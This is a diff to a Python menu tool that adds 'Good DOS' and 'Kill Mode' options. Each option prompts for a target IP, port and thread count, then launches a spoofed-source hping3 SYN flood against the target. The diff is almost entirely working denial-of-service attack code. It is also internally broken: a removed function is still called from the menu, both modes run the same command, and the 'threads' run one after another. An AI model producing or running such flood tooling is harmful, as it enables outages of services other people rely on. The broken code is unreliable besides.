@@ -1191,32 +1191,104 @@ def signal_handler(sig, frame):
 def clear_screen():
     print("\033[H\033[J", end="")  #
 
-def run_hping3_manual():
+def signal_handler(sig, frame):
+    print("\nInterrupt received. Returning to the menu...")
+    sys.exit(0)
+
+# Register signal handler for Ctrl+C
+signal.signal(signal.SIGINT, signal_handler)
+
+# Function to run the SYN flood (Good DOS)
+def run_hping3_good_dos(target_ip, target_port, threads):
+    command_good_dos = f"sudo hping3 --flood --syn -p {target_port} --rand-source -i u10000 {target_ip}"
+    print(f"Running Good DOS attack on {target_ip} using port {target_port} with {threads} threads...")
+    
+    # Run the attack using multiple threads
+    for _ in range(threads):
+        subprocess.run(command_good_dos, shell=True)
+
+# Function to run the Kill Mode (Stronger DDoS)
+def run_hping3_kill_mode(target_ip, target_port, threads):
+    command_kill_mode = f"sudo hping3 --flood --syn -p {target_port} --rand-source -i u10000 {target_ip}"
+    print(f"Running Kill Mode attack on {target_ip} using port {target_port} with {threads} threads...")
+    
+    # Run the attack using multiple threads
+    for _ in range(threads):
+        subprocess.run(command_kill_mode, shell=True)
+
+def run_hping3_good_dos_prompt():
     while True:
-        command = input("Enter hping3 command (or type 'exit' to return to the menu): ").strip()
-        if command.lower() == "exit":
-            print("Returning to the menu...")
-            break
         try:
-            subprocess.run(command, shell=True)
+            # Prompt for target IP
+            target_ip = input("Enter the target IP address: ").strip()
+            # Prompt for target port
+            target_port = input("Enter the port number (e.g., 80): ").strip()
+
+            # Prompt for number of threads
+            threads = int(input("Enter the number of threads (80, 100, 150, 250): ").strip())
+
+            if threads in [80, 100, 150, 250]:
+                run_hping3_good_dos(target_ip, target_port, threads)
+            else:
+                print("Invalid thread count. Please enter one of the allowed values: 80, 100, 150, 250.")
+                continue
+        
         except Exception as e:
             print(f"Error running command: {e}")
+        
+        # Option to stop or continue
+        cont = input("Do you want to run another attack? (y/n): ").strip().lower()
+        if cont != 'y':
+            print("Returning to the menu...")
+            break
+
+def run_hping3_kill_mode_prompt():
+    while True:
+        try:
+            # Prompt for target IP
+            target_ip = input("Enter the target IP address: ").strip()
+            # Prompt for target port
+            target_port = input("Enter the port number (e.g., 80): ").strip()
+
+            # Prompt for number of threads
+            threads = int(input("Enter the number of threads (100, 250, 500, 1000): ").strip())
+
+            if threads in [100, 250, 500, 1000]:
+                run_hping3_kill_mode(target_ip, target_port, threads)
+            else:
+                print("Invalid thread count. Please enter one of the allowed values: 100, 250, 500, 1000.")
+                continue
+        
+        except Exception as e:
+            print(f"Error running command: {e}")
+        
+        # Option to stop or continue
+        cont = input("Do you want to run another attack? (y/n): ").strip().lower()
+        if cont != 'y':
+            print("Returning to the menu...")
+            break
 
 def hping3_menu():
     while True:
-        clear_screen()
         print("\nHping3 Menu:")
         print("1. Run Hping3 (Manual Command)")
-        print("2. Return to Main Menu")
+        print("2. Good DOS")
+        print("3. Kill Mode")
+        print("4. Return to Main Menu")
 
         choice = input("Choose an option: ")
 
         if choice == "1":
             run_hping3_manual()
         elif choice == "2":
+            run_hping3_good_dos_prompt()
+        elif choice == "3":
+            run_hping3_kill_mode_prompt()
+        elif choice == "4":
             break
         else:
             print("Invalid choice, please try again.")
+
 
 def main_menu():
     while True:
